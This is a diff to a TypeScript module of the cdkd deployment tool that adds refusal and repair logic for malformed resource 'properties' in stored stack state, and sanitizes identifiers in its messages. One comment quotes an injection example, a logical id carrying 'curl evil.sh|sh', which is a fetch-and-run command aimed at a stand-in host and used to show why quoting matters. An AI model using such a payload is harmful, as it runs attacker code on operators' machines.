@@ -1,6 +1,12 @@
 import { CdkdError } from '../utils/error-handler.js';
 import { markNonRetryable } from '../deployment/retryable-errors.js';
-import { UNRENDERABLE, displaySafe, truncateCodePoints } from '../utils/display-safe.js';
+import {
+  IDENT_MAX_CODE_POINTS,
+  UNRENDERABLE,
+  displayIdent,
+  displaySafe,
+  truncateCodePoints,
+} from '../utils/display-safe.js';
 import { shellQuote } from './lock-contention-message.js';
 import { isReadableBag } from '../types/state.js';
 import type { StackState } from '../types/state.js';
@@ -213,12 +219,16 @@ export type RenderedStateContainer = 'outputs' | 'skippedOutputs' | 'attributes'
  * a re-create-the-world warning to a record whose resource list is intact.
  *
  * It is NOT that these containers are display-only. `properties` is read by the
- * deploy change calculation (`src/analyzer/diff-calculator.ts`), which imports
- * nothing from this module, and a non-object there compares unequal to any
- * desired object and yields a spurious property-change set — filed as
- * go-to-k/cdkd#3191. An earlier revision of this comment asserted the
- * display-only premise, which would have read as licence to drop a guard on
- * that path (review of go-to-k/cdkd#3190).
+ * deploy change calculation (`src/analyzer/diff-calculator.ts`), where a
+ * non-object compares unequal to any
+ * desired object and yields a spurious property-change set — measured there as
+ * a REPLACEMENT of the live resource, and closed by
+ * {@link refuseMalformedResourceProperties} (go-to-k/cdkd#3191). An earlier
+ * revision of this comment asserted the display-only premise, which would have
+ * read as licence to drop a guard on that path (review of go-to-k/cdkd#3190).
+ * That the path is now guarded does not restore the premise: this text is still
+ * not the one to borrow, because the deploy path REFUSES where these views
+ * continue.
  *
  * What stays the same is the remedy: `--json` is the mode that shows the
  * stored value.
@@ -713,5 +723,337 @@ export function malformedLocalOutputsWarning(stackName: string, region: string):
     `element. Continuing with it EMPTY: every reference to an output of this record resolves to ` +
     `nothing and is dropped, which is not the same as the record holding none. See the stored ` +
     `value with: cdkd state show ${shellQuote(stack)} --stack-region ${shellQuote(reg)} --json`
+  );
+}
+
+/** How many logical ids a `properties` message names before it says "and N more". */
+const NAMED_UNREADABLE_PROPERTY_BAGS = 5;
+
+/**
+ * The `State for '<stack>' ('<region>')` opening of a `properties` message,
+ * and the matching `--stack-region` flag on its remedy command.
+ *
+ * **BOTH are optional, and an ABSENT identity is not a degraded case — it is
+ * the only honest one for a caller that holds no TRUSTED identity.**
+ * `src/analyzer/diff-calculator.ts` is exactly that caller: it receives a
+ * `StackState` and nothing else, and `parseStateBody` validates neither
+ * `stackName` nor `region`, so the record being declared malformed would be
+ * naming ITSELF. An attacker holding `s3:PutObject` on one stack's key could
+ * then plant `"stackName": "prod-payments"` in a `dev` record and have the
+ * refusal hand the operator a pasteable `cdkd state show 'prod-payments'
+ * --stack-region '...'` — a destructive instruction aimed at a healthy record,
+ * while the damaged one goes unnamed (review of go-to-k/cdkd#3191). Every
+ * other refusal in this module takes the CALLER's resolved identity, and this
+ * one drops the clause instead rather than inventing or borrowing one.
+ *
+ * `src/cli/commands/diff-recursive.ts` DOES hold a trusted pair — the
+ * `stackName` / `region` its own load was keyed on — so the read-only warning
+ * passes them and the asymmetry is the point rather than an oversight. A later
+ * lane that threads the trusted pair into `calculateDiff` passes it here with
+ * no signature change.
+ *
+ * A region may also be absent on a v1 record, which predates the
+ * region-prefixed key layout. A placeholder would put a `--stack-region` into
+ * a pasted command that selects no record at all, so it is dropped for the
+ * same reason — the call go-to-k/cdkd#3226 makes for `malformedStateDetail`.
+ */
+function stackClause(stackName: string | undefined, region: string | undefined): string {
+  if (stackName === undefined) return 'The state record this command loaded';
+  const where = region === undefined ? '' : ` (${shellQuote(safeIdentifier(region))})`;
+  return `State for ${shellQuote(safeIdentifier(stackName))}${where}`;
+}
+
+/** The remedy command {@link stackClause}'s message ends on. */
+function inspectCommand(stackName: string | undefined, region: string | undefined): string {
+  if (stackName === undefined) {
+    // A TEMPLATE rather than a command, and it says so: substituting anything
+    // here would be substituting the untrusted values the clause above drops.
+    return 'cdkd state show <stack> --stack-region <region> --json';
+  }
+  const flag = region === undefined ? '' : ` --stack-region ${shellQuote(safeIdentifier(region))}`;
+  return `cdkd state show ${shellQuote(safeIdentifier(stackName))}${flag} --json`;
+}
+
+/**
+ * The logical ids whose resource record carries a `properties` bag that cannot
+ * be read as a map (issue
+ * [#3191](https://github.com/go-to-k/cdkd/issues/3191)).
+ *
+ * A THIRD container, on the ENTRY rather than on the record root, and it is a
+ * separate predicate from {@link hasReadableResources} for the reason every
+ * split in this module is: the CONSEQUENCE differs. An unreadable `resources`
+ * map reads as an empty STACK; an unreadable `properties` bag reads as a
+ * resource whose every declared property is MISSING, which
+ * `src/analyzer/diff-calculator.ts` turns into a property-change set and, for
+ * a create-only property, into a REPLACEMENT of the live resource.
+ *
+ * `undefined` is NOT exempt here, unlike in {@link hasReadableOutputs}. That
+ * exemption exists because cdkd itself writes records with no `outputs` key —
+ * `JSON.stringify` drops an `undefined` field on the deploy's failure-path
+ * saves. Nothing writes a resource record with no `properties`: every writer
+ * in `src/` assigns an object (`cdkd import` spells it `Properties ?? {}`),
+ * `JSON.stringify` never drops a `{}`, and the field is REQUIRED by
+ * `ResourceState`. An absent bag is therefore a hand edit or a truncation, and
+ * it is one of the two shapes that used to die on a bare `TypeError` naming no
+ * stack, no key and no remedy (`Cannot convert undefined or null to object`).
+ *
+ * An entry that is not a readable OBJECT is SKIPPED rather than named, so this
+ * verdict is ORDER-INDEPENDENT with respect to the entry-level guard
+ * go-to-k/cdkd#3226 adds: a `null` entry has no `properties` to test, and
+ * reading one off a string entry would name a per-character defect that is
+ * really the entry's. Likewise a `resources` bag that is not readable at all
+ * yields `[]` here rather than ids invented from a string's characters — that
+ * class is {@link hasReadableResources}'s to report. What a caller must not do
+ * is take only this one.
+ */
+export function unreadableResourcePropertyBags(state: StackState): readonly string[] {
+  if (!hasReadableResources(state)) return [];
+  return Object.entries(state.resources)
+    .filter(
+      ([, entry]) =>
+        isReadableBag(entry) && !isReadableBag((entry as { properties?: unknown }).properties)
+    )
+    .map(([logicalId]) => logicalId);
+}
+
+/**
+ * For a command that can WRITE state — `cdkd deploy` — refuse the record
+ * naming the resources whose `properties` bag could not be read (issue
+ * [#3191](https://github.com/go-to-k/cdkd/issues/3191)).
+ *
+ * **REFUSE, and repairing to `{}` is not the safe alternative here — it is the
+ * SAME outcome.** That is the measurement the issue asked for, and it is what
+ * settles the contract rather than the write-capable rule alone. Driven
+ * through the real `DiffCalculator` against an `AWS::S3::Bucket` declaring
+ * `BucketName`, a stored `properties` of `"abcdef"`, `[]` and `5` each
+ * produced a property change carrying `requiresReplacement: true` — and `[]`
+ * and `5` enumerate no keys, so they ARE the repaired-to-empty case. A repair
+ * would launder a torn record into a silent REPLACE of a live resource, which
+ * is the data loss the guard exists to prevent; only a refusal closes it.
+ *
+ * The cost is stated rather than argued away: a deploy over ONE torn record
+ * aborts the whole run, including the stacks and resources that are fine.
+ * That is the right trade against replacing a resource nobody asked to
+ * replace, and it is paid before anything irreversible: the refusal is raised
+ * from the diff, so nothing is provisioned and no state is written for the
+ * stack, and the deploy's lock is released by its own `finally`. NOT "before
+ * any provider call" — that claim is false and was corrected in review:
+ * `DeployEngine.kickOffAutoRefreshObservedProperties` fires fire-and-forget
+ * `provider.readCurrentState` READS earlier in the same run. They persist
+ * nothing, because the save they would be drained into never happens.
+ *
+ * The identity in the message is the CALLER's, never the record's — see
+ * {@link stackClause}, where an absent identity is the honest case rather than
+ * a degraded one.
+ *
+ * Deliberately NOT folded into {@link refuseMalformedState}, for the reason
+ * {@link unreadableResourcePropertyBags} gives: that predicate answers a
+ * question about the record ROOT, and its four callers (`cdkd scrub`,
+ * `import`, `orphan`, `rollback`) have made no decision about this one. Three
+ * of them do not compare properties at all, and `cdkd rollback` replays a
+ * journal rather than diffing, so an unrelated broken bag would stop the
+ * command documented as the way to UNWIND a stack whose state is already
+ * suspect. This rule is OPT-IN, taken by the flow that COMPARES the bag.
+ */
+export function refuseMalformedResourceProperties(
+  state: StackState,
+  stackName: string | undefined,
+  region: string | undefined
+): void {
+  const unreadable = unreadableResourcePropertyBags(state);
+  if (unreadable.length === 0) return;
+  // `markNonRetryable` for the reason `refuseMalformedNestedChildOutputs`
+  // carries it: the verdict comes from a PERSISTED record, so no retry can
+  // change it, while the message interpolates record-derived identifiers a
+  // SUBSTRING-matching retry classifier can read as transient. Issue #1838.
+  throw markNonRetryable(
+    new CdkdError(
+      malformedResourcePropertiesRefusalMessage(stackName, region, unreadable),
+      STATE_RESOURCES_MALFORMED
+    )
+  );
+}
+
+/**
+ * For a READ-ONLY command — `cdkd diff` — give each unreadable `properties`
+ * bag an empty map so the command can report on the record, and return the ids
+ * so the caller can warn.
+ *
+ * The read-only twin of {@link refuseMalformedResourceProperties}, and the
+ * WRITE is what makes the difference, not the shape: `cdkd diff` persists
+ * nothing, so it cannot launder the evidence, and previewing the remaining
+ * resources beats aborting the whole preview over one torn bag.
+ *
+ * Repair-to-`{}` rather than a DROP of the whole entry, because an empty bag
+ * IS honest for this container: the entry still names a real `resourceType`
+ * and `physicalId`, so it belongs in the diff as a row.
+ * Dropping it would report the resource as a CREATE, inventing a change the
+ * next deploy does not make.
+ *
+ * What the repair does NOT do is make the preview accurate, which is why the
+ * warning is not optional. The caller says so in
+ * {@link malformedResourcePropertiesWarning}'s terms, which are deliberately
+ * wider than "previewed as an addition": a node whose template is GONE —
+ * `buildDeletedSubtree` diffs a removed nested child against an EMPTY template
+ * — declares nothing, so its rows are DELETEs whose previous side is now the
+ * repaired `{}` rather than what the record holds.
+ *
+ * Call it AFTER {@link repairMalformedResourcesForReadOnly}: an unreadable BAG
+ * has no entries to walk, and the predicate deliberately returns `[]` for one.
+ *
+ * And call it again after anything that SPLICES further records into
+ * `state.resources` — `computeStackDiff`'s rollback-orphan adoption is the one
+ * such site, and its records come straight from `state.orphans[].state`, which
+ * this load never walked (review of go-to-k/cdkd#3191).
+ */
+export function repairMalformedResourcePropertiesForReadOnly(state: StackState): readonly string[] {
+  const unreadable = unreadableResourcePropertyBags(state);
+  for (const logicalId of unreadable) {
+    (state.resources[logicalId] as { properties: Record<string, unknown> }).properties = {};
+  }
+  return unreadable;
+}
+
+/**
+ * The half the refusal and the warning share: what is wrong and which records.
+ *
+ * ONE spelling rather than two, for the reason {@link malformedStateDetail}
+ * exists beside its own pair — the two texts differ only in what happens NEXT,
+ * and a second copy of the diagnosis is what drifts.
+ *
+ * The STACK and REGION go through {@link safeIdentifier} and are THEN
+ * shell-quoted, for the reasons that helper's own note gives: each reaches this
+ * text from a hand-edited record or an S3 key.
+ *
+ * **The LOGICAL IDS take `displayIdent` instead, and NOT `shellQuote`** — the
+ * answer {@link safeIdentifier}'s note already prescribes for names in a
+ * `', '`-joined list, applied one level down. The three properties that matters
+ * for, in the order they bite:
+ *
+ * 1. **IDENTITY.** `displaySafe` TRIMS, so a sanitize-and-quote pair renders
+ *    `"Bucket "`, `" Bucket"` and `"Bucket\t"` byte-identically to a HEALTHY
+ *    sibling key spelled `Bucket`. Plant a torn `resources["Bucket "]` beside a
+ *    real `Bucket` and the refusal names the intact record: the operator opens
+ *    it, finds nothing wrong, and concludes cdkd is the broken party while the
+ *    damaged entry goes unnamed. That is the same misdirection go-to-k/cdkd#3164
+ *    closed for stack names and the review of go-to-k/cdkd#3191 closed for this
+ *    module's identity clause. `displayIdent` compares the sanitized text
+ *    against the raw one and JSON-quotes whenever they differ, so a padded id
+ *    can never render bare.
+ * 2. **BOUNDARY.** JSON-quoting escapes the `'` an id spelled
+ *    `x' Inspect it with: curl evil.sh|sh #` would otherwise use to plant a
+ *    forged remedy ahead of the real one, on a line that ends in a pasteable
+ *    command. It also supplies the quotes the old `shellQuote` wrapper added —
+ *    which is why the wrapper GOES rather than composing, per the same note.
+ * 3. **TRUNCATION.** `[cut: N more characters withheld]` cannot be mistaken for
+ *    content, where the old `...` tail was indistinguishable from a legitimate
+ *    id ending `Prod...`.
+ *
+ * The cap is passed EXPLICITLY although it equals the default: a logical id is
+ * valid up to `IDENT_MAX_CODE_POINTS`, and the point of not reusing
+ * {@link safeIdentifier} here is that its 128 would truncate a legitimate long
+ * id into one naming no record. Spelling the cap keeps that decision visible at
+ * the site it was made for.
+ *
+ * Known residual, NOT introduced here: `,` is in `PLAIN_IDENT`, so an id
+ * carrying one still renders bare inside this `', '`-joined list and reads as
+ * two entries — the joined-list ambiguity recorded on go-to-k/cdkd#3179 for
+ * every caller of the helper, not a property of this one.
+ *
+ * NAMED rather than listed in full: a record whose 500 resources were all
+ * hand-edited must not push the remedy command off the reader's screen.
+ *
+ * REFUSES an empty list rather than rendering `holds 0 resource record(s) — —`.
+ * Both callers guard, but they are exported and a later one need not (review of
+ * go-to-k/cdkd#3191).
+ */
+function namedPropertyBagsClause(
+  stackName: string | undefined,
+  region: string | undefined,
+  logicalIds: readonly string[]
+): string {
+  if (logicalIds.length === 0) {
+    throw new Error(
+      'malformed-resources-bag: a properties message needs at least one logical id to name'
+    );
+  }
+  const named = logicalIds
+    .slice(0, NAMED_UNREADABLE_PROPERTY_BAGS)
+    .map((id) => displayIdent(id, { maxCodePoints: IDENT_MAX_CODE_POINTS }))
+    .join(', ');
+  const rest = logicalIds.length - NAMED_UNREADABLE_PROPERTY_BAGS;
+  const more = rest > 0 ? ` and ${rest} more` : '';
+  return (
+    `${stackClause(stackName, region)} holds ${logicalIds.length} resource ` +
+    `record(s) whose 'properties' map cannot be read — ${named}${more} — because it is absent, ` +
+    `null, or not an object. The record is malformed or truncated. Comparing a template against ` +
+    `one reports every property the template declares as ADDED (a string bag also invents one ` +
+    `change per character), and a create-only property among them is a REPLACEMENT of the live ` +
+    `resource.`
+  );
+}
+
+/**
+ * The text {@link refuseMalformedResourceProperties} raises.
+ *
+ * `stackName` / `region` are the CALLER's resolved identity or nothing at all;
+ * {@link stackClause} is the authority for why this one may be handed neither.
+ *
+ * **It must be true under `cdkd deploy --dry-run` as well**, and the first
+ * revision was not. Provisioning is gated AFTER the diff
+ * (`deploy-engine.ts`'s `if (this.options.dryRun)` return sits below
+ * `calculateDiff`), so a dry run reaches this refusal and aborts — while the
+ * text asserted "it would DELETE and re-create resources", which a dry run
+ * would not do. A refusal that misstates what was about to happen is the same
+ * defect class as one naming the wrong record (review of go-to-k/cdkd#3191).
+ *
+ * **A dry run REFUSES rather than repairing, and that is the decision.** The
+ * repair-and-warn half of this container belongs to `cdkd diff`, and the
+ * argument recorded for it in `.claude/rules/state-malformed-properties.md` —
+ * "a preview of the rest of the stack beats an abort" — does not transfer,
+ * because it is already SATISFIED by that sibling: a user who wants the
+ * repaired preview runs `cdkd diff` and gets it, with the warning. `cdkd diff`
+ * refusing would leave no way to preview at all; `cdkd deploy --dry-run`
+ * refusing costs nothing that is not available one command over. Against that,
+ * repairing here would need a mode threaded into `calculateDiff`, the single
+ * chokepoint whose whole value is that both callers share it — and it would
+ * create the worst arm of all: a plausible-looking `--dry-run` plan followed
+ * by a refusal the moment the flag comes off. So the message points at
+ * `cdkd diff` instead of weakening the guard.
+ */
+export function malformedResourcePropertiesRefusalMessage(
+  stackName: string | undefined,
+  region: string | undefined,
+  logicalIds: readonly string[]
+): string {
+  return (
+    `${namedPropertyBagsClause(stackName, region, logicalIds)} 'cdkd deploy' can WRITE state and ` +
+    `AWS resources, so it refuses rather than continuing — under '--dry-run' too, because the ` +
+    `plan a dry run would print is the wrong one: a DELETE and re-create of resources the ` +
+    `template did not change, and reading the bag as empty produces that same verdict rather ` +
+    `than avoiding it. Nothing was provisioned and no state was written FOR THIS STACK. Repair or ` +
+    `remove the record first; 'cdkd diff' previews the rest of the stack with those maps read ` +
+    `as EMPTY and warns that it did. Inspect the record with: ` +
+    `${inspectCommand(stackName, region)}`
+  );
+}
+
+/**
+ * The warning a caller of {@link repairMalformedResourcePropertiesForReadOnly}
+ * emits.
+ */
+export function malformedResourcePropertiesWarning(
+  stackName: string | undefined,
+  region: string | undefined,
+  logicalIds: readonly string[]
+): string {
+  return (
+    `${namedPropertyBagsClause(stackName, region, logicalIds)} Continuing with those maps ` +
+    `EMPTY: what these records are stored as holding is NOT what this preview compares against. ` +
+    `Where the template still declares the resource, every property it declares previews as an ` +
+    `addition and a create-only one as a replacement; where it no longer declares it, the ` +
+    `DELETE row shows an empty previous side instead of the stored one. ` +
+    `Do NOT run 'cdkd deploy' against this record — it REFUSES on the same defect rather than ` +
+    `acting on this preview. See the stored values with: ${inspectCommand(stackName, region)}`
   );
 }
